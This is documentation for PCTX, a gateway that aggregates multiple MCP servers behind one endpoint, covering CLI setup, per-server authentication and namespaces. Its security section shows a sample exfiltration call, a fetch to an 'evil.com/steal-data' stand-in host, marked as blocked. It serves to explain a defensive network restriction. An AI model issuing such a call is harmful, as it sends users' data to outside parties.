# Upstream MCP Servers

Connect multiple MCP servers through a single gateway with unified authentication.

## Overview

PCTX aggregates multiple MCP servers into a single endpoint, allowing AI agents to interact with many services through one gateway.

**Key Points:**
- **MCP Server to AI Agents**: PCTX exposes a single MCP server interface
- **MCP Client to Upstream**: PCTX acts as an MCP client to multiple upstream servers
- **Bring Your Own LLM**: Works with any AI agent (Claude, ChatGPT, custom agents)
- **Deploy Anywhere**: Run locally or in the cloud with full control

### Single Gateway

```
AI Agent
    ↓
PCTX Gateway (localhost:8080)
    ├→ Google Drive MCP
    ├→ Slack MCP
    ├→ GitHub MCP
    └→ Custom Internal MCP
```

Instead of configuring each MCP server separately in your AI tool, configure PCTX once.

## Configuration

### Add Multiple Servers

```bash
# Add Google Drive MCP server
pctx mcp add gdrive https://mcp.gdrive.com
pctx mcp auth gdrive

# Add Slack MCP server
pctx mcp add slack https://mcp.slack.com
pctx mcp auth slack

# Add internal tools
pctx mcp add internal http://localhost:3000/mcp

# Start gateway with all servers
pctx start
```

### List Configured Servers

```bash
pctx mcp list
```

Output:
```
┌──────────┬─────────────────────────┬────────┬────────┐
│ Name     │ URL                     │ Auth   │ Status │
├──────────┼─────────────────────────┼────────┼────────┤
│ gdrive   │ https://mcp.gdrive.com  │ OAuth  │ ✓      │
│ slack    │ https://mcp.slack.com   │ OAuth  │ ✓      │
│ internal │ http://localhost:3000   │ None   │ ✓      │
└──────────┴─────────────────────────┴────────┴────────┘
```

## How It Works

### 1. Server Registration

Each server is registered with a unique name:

```bash
pctx mcp add <name> <url>
```

The name becomes the TypeScript namespace for that server's tools.

### 2. Tool Aggregation

When PCTX starts, it:
1. Connects to each configured server
2. Fetches tool definitions from each
3. Generates TypeScript namespaces
4. Exposes all tools through a single endpoint

```bash
pctx start
# Connecting to 'gdrive'...
#   ✓ Connected to 'gdrive' at https://mcp.gdrive.com
# Connecting to 'slack'...
#   ✓ Connected to 'slack' at https://mcp.slack.com
# Connecting to 'internal'...
#   ✓ Connected to 'internal' at http://localhost:3000
```

### 3. Namespace Organization

Each server's tools are accessible via its namespace:

```typescript
// Google Drive tools
await gdrive.getSheet({ sheetId: 'abc' });
await gdrive.createDocument({ title: 'Report' });

// Slack tools
await slack.sendMessage({ channel: '#general', text: 'hi' });
await slack.getUsers();

// Internal tools
await internal.processOrder({ orderId: '123' });
await internal.sendNotification({ type: 'email' });
```

## Authentication Management

Each server can have its own authentication:

```toml
# ~/.pctx/config.toml
[[servers]]
name = "gdrive"
url = "https://mcp.gdrive.com"

[servers.auth]
type = "oauth2"
# ... OAuth config ...

[[servers]]
name = "slack"
url = "https://mcp.slack.com"

[servers.auth]
type = "oauth2"
# ... Different OAuth config ...

[[servers]]
name = "internal"
url = "http://localhost:3000/mcp"
# No auth required
```

PCTX handles authentication separately for each server. See [MCP Authentication Guide](mcp-auth.md) for details.

## Use Cases

### Cross-Service Workflows

Combine tools from multiple services:

```typescript
// Get sales data from internal API
const sales = await internal.getSalesData({ month: 'January' });

// Create summary in Google Sheets
const sheet = await gdrive.createSheet({
  title: 'January Sales Summary'
});

await gdrive.updateSheet({
  sheetId: sheet.id,
  data: sales
});

// Notify team in Slack
await slack.sendMessage({
  channel: '#sales',
  text: `January sales summary ready: ${sheet.url}`
});
```

### Unified Access

One gateway for all your MCP servers:

```bash
# AI tool configuration
MCP_SERVER_URL=http://localhost:8080/mcp
```

Instead of configuring 10 different MCP servers, configure one PCTX gateway.

### Development and Production

Use different servers for different environments:

```bash
# Development
pctx mcp add api-dev http://localhost:3000/mcp

# Production
pctx mcp add api-prod https://api.example.com/mcp
pctx mcp auth api-prod
```

Switch by changing which servers are configured.

## Namespace Naming

Server names should be:
- Lowercase
- No spaces or special characters
- Descriptive
- Valid TypeScript identifiers

```bash
# Good
pctx mcp add gdrive https://mcp.gdrive.com
pctx mcp add slack_prod https://mcp.slack.com
pctx mcp add my_api https://api.example.com

# Bad
pctx mcp add "Google Drive" https://mcp.gdrive.com  # Spaces
pctx mcp add api-prod https://api.example.com        # Hyphens not ideal
pctx mcp add 123api https://api.example.com          # Starts with number
```

## Managing Servers

### Add Server

```bash
pctx mcp add <name> <url>
```

### Configure Authentication

```bash
pctx mcp auth <name>
```

Interactive prompt guides you through OAuth, env vars, keychain, or command options.

### View Server Details

```bash
pctx mcp get <name>
```

Shows URL, auth configuration, and connection status.

### Remove Server

```bash
pctx mcp remove <name>
```

Removes server configuration and credentials.

### Test Connection

```bash
pctx mcp list
```

Tests connection to all servers and displays health status.

## Gateway Architecture

```
┌─────────────────────────────────────┐
│         AI Agent / Tool             │
└─────────────────┬───────────────────┘
                  │
                  ↓ MCP Protocol
┌─────────────────────────────────────┐
│         PCTX Gateway                │
│  - Tool aggregation                 │
│  - Authentication handling          │
│  - TypeScript code execution        │
│  - Namespace management             │
└────┬──────────┬──────────┬──────────┘
     │          │          │
     ↓          ↓          ↓
┌─────────┐ ┌─────────┐ ┌─────────┐
│ Server  │ │ Server  │ │ Server  │
│   A     │ │   B     │ │   C     │
└─────────┘ └─────────┘ └─────────┘
```

PCTX acts as a proxy, forwarding tool calls to the appropriate upstream server based on namespace.

## Configuration File

All servers are stored in `~/.pctx/config.toml`:

```toml
[[servers]]
name = "gdrive"
url = "https://mcp.gdrive.com"

[servers.auth]
type = "oauth2"
client_id = "..."
# ...

[[servers]]
name = "slack"
url = "https://mcp.slack.com"

[servers.auth]
type = "oauth2"
client_id = "..."
# ...

[[servers]]
name = "internal"
url = "http://localhost:3000/mcp"
```

Edit manually or use CLI commands.

## Security Considerations

### Authentication Isolation

Each server has isolated authentication:
- Credentials for one server don't affect others
- OAuth tokens managed separately
- Failures in one server don't impact others

### Network Restrictions

Code execution can only access configured server hosts:

```typescript
// ✓ Allowed - configured servers
await gdrive.getSheet({ sheetId: 'abc' });
await slack.sendMessage({ channel: '#general', text: 'hi' });

// ✗ Blocked - not a configured server
await fetch('https://evil.com/steal-data');
```

### Credential Management

PCTX handles all authentication before code execution:
- AI never sees tokens or credentials
- Each server authenticated independently
- Automatic token refresh for OAuth

## Troubleshooting

### Server Won't Connect

```bash
# Check server details
pctx mcp get <name>

# Verify URL is correct
curl <url>

# Check authentication
pctx mcp auth <name>
```

### Namespace Conflicts

If two servers have the same name, the second one will fail to add:

```bash
pctx mcp add api https://api1.example.com  # OK
pctx mcp add api https://api2.example.com  # Error: server 'api' already exists
```

Use different names:
```bash
pctx mcp add api1 https://api1.example.com
pctx mcp add api2 https://api2.example.com
```

### Authentication Failures

Check authentication for specific server:

```bash
pctx mcp get <name>
```

Reconfigure if needed:
```bash
pctx mcp auth <name>
```

## Learn More

- [Code Mode Interface](code-mode.md) - How tools are exposed as TypeScript functions
- [MCP Authentication](mcp-auth.md) - Configuring authentication for each server
- [Model Context Protocol](https://modelcontextprotocol.io/) - MCP specification
